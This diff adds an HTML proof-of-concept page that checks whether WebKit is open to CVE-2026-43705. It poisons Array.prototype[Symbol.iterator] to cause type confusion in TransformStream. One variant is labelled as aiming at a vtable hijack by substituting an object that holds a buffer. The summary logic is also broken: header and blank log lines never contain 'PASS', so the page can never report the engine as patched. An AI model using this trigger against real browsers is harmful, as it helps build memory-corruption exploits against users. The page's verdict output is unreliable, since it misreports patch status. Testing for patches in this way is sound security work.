@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CVE-2026-43705 Type Confusion Test</title>
+<style>
+body { background: #000; color: #0f0; font-family: monospace; font-size: 14px; padding: 20px; }
+h1 { color: #ff0; }
+.pass { color: #0f0; font-weight: bold; }
+.fail { color: #f00; font-weight: bold; }
+.crash { color: #f0f; font-weight: bold; }
+.info { color: #0ff; }
+pre { background: #111; padding: 10px; border: 1px solid #333; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<h1>CVE-2026-43705 - WebKit Type Confusion</h1>
+<p>TransformStream + Array.prototype[Symbol.iterator] poisoning</p>
+<hr>
+<div id="log"></div>
+<script>
+var logEl = document.getElementById('log');
+var results = [];
+
+function log(msg, cls) {
+    var d = document.createElement('div');
+    d.className = cls || '';
+    d.textContent = msg;
+    logEl.appendChild(d);
+    results.push(msg);
+}
+
+function check(label, fn) {
+    var message;
+    try {
+        fn();
+        message = 'FAIL: ' + label + ' did not throw';
+        log(message, 'fail');
+    } catch (e) {
+        if (e instanceof TypeError) {
+            message = 'PASS: ' + label + ' threw TypeError (PATCHED)';
+            log(message, 'pass');
+        } else {
+            message = 'CRASH-CAUGHT: ' + label + ' threw ' + e.constructor.name + ': ' + e.message;
+            log(message, 'crash');
+        }
+    }
+    return message;
+}
+
+log('=== CVE-2026-43705 Type Confusion Test ===', 'info');
+log('Testing if WebKit is patched or vulnerable...', 'info');
+log('');
+
+var originalIterator = Array.prototype[Symbol.iterator];
+
+// Test 1: Plain object substitution
+log('--- Test 1: Plain object substitution ---', 'info');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var arr = this;
+        var i = 0;
+        return {
+            next: function() {
+                if (i >= arr.length) return { done: true };
+                var val = arr[i];
+                if (arr.length === 3 && i >= 1) val = { fake: true };
+                i++;
+                return { value: val, done: false };
+            }
+        };
+    };
+    check('plain-object substitution', function() { new TransformStream(); });
+} catch(e) {
+    log('UNHANDLED EXCEPTION: ' + e, 'crash');
+}
+Array.prototype[Symbol.iterator] = originalIterator;
+
+// Test 2: Object with heap pointer (the interesting one)
+log('');
+log('--- Test 2: Object with ArrayBuffer pointer ---', 'info');
+log('(This variant targets write-increment / vtable hijack)', 'info');
+try {
+    var buf = new ArrayBuffer(65536);
+    Array.prototype[Symbol.iterator] = function() {
+        var arr = this;
+        var i = 0;
+        return {
+            next: function() {
+                if (i >= arr.length) return { done: true };
+                var val = arr[i];
+                if (arr.length === 3 && i >= 1) val = { pad: 0, ptr: buf };
+                i++;
+                return { value: val, done: false };
+            }
+        };
+    };
+    check('object-reference substitution', function() { new TransformStream(); });
+} catch(e) {
+    log('UNHANDLED EXCEPTION: ' + e, 'crash');
+}
+Array.prototype[Symbol.iterator] = originalIterator;
+
+// Test 3: Truncated iterator
+log('');
+log('--- Test 3: Truncated iterator ---', 'info');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        return { next: function() { return { done: true }; } };
+    };
+    check('truncated iterator', function() { new TransformStream(); });
+} catch(e) {
+    log('UNHANDLED EXCEPTION: ' + e, 'crash');
+}
+Array.prototype[Symbol.iterator] = originalIterator;
+
+// Test 4: Control test - normal TransformStream
+log('');
+log('--- Test 4: Control (normal TransformStream) ---', 'info');
+try {
+    var ts = new TransformStream();
+    log('PASS: Normal TransformStream created successfully', 'pass');
+} catch(e) {
+    log('UNEXPECTED: Normal TransformStream failed: ' + e, 'fail');
+}
+
+// Summary
+log('');
+log('=== SUMMARY ===', 'info');
+var allPass = results.every(function(r) { return r.indexOf('PASS') >= 0; });
+var anyCrash = results.some(function(r) { return r.indexOf('CRASH') >= 0; });
+var anyFail = results.some(function(r) { return r.indexOf('FAIL') >= 0; });
+
+if (allPass) {
+    log('ALL TESTS PASSED = WebKit is PATCHED against CVE-2026-43705', 'pass');
+} else if (anyCrash) {
+    log('CRASH DETECTED = WebKit is VULNERABLE to CVE-2026-43705!', 'crash');
+} else if (anyFail) {
+    log('SOME TESTS FAILED = Results mixed, need manual analysis', 'fail');
+} else {
+    log('UNEXPECTED RESULTS', 'fail');
+}
+
+log('');
+log('Results count: ' + results.length, 'info');
+
+// Store results globally for retrieval
+window.__cve_test_results = results.join('\n');
+</script>
+</body>
+</html>
